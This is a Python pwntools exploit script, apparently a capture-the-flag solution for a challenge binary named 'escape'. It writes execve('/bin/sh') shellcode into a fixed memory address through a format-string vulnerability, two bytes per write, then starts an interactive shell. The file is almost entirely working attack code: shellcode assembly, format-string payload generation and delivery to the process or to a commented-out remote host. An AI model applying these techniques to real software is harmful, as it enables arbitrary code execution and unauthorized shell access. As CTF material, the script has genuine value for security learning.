#!/usr/bin/env python

from pwn import *
# context.log_level = 'debug'
# context.arch = 'amd64'
# ENV
e = context.binary = ELF('./escape')
lib = e.libc
r = process("./escape")
# r=remote("escape.sstf.site", 5051)

offset = 8
shellcode_addr = 0x50510000

shellcode =('''
    mov rsp, 0x50510500
    mov DWORD PTR [rsp], 0x50510100
''')

shellcode = asm(shellcode).ljust(0x20, b"\x90")


shellcode+=asm('''
    /* execve(path='/bin/sh', argv=0, envp=0) */
    /* push b'/bin/sh\x00' */

    sub rsp, 8
    push 0x69622f
    add rsp, 11
    push 0x68732f6e
    sub rsp, 3
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    /* call execve() */
    mov eax,  0x3b
    syscall

''')

print(disasm(shellcode))
print(len(shellcode))

for addr in range(shellcode_addr, shellcode_addr+len(shellcode), 8):
    log.info("addr: %#x" %addr)
    for i in range(0,8,2):
        minishell = shellcode[:2]
        shellcode= shellcode[2:]
        payload = fmtstr_payload(offset, {addr+i: minishell}, write_size='short')
        print(b"shellcode: "+minishell)
        print(b"payload: "+(payload))
        r.sendlineafter(b'Enter: ', payload)

pause()
gdb.attach(r, gdbscript="b *0x0000000050510000")
r.sendline(b'done')


r.interactive()
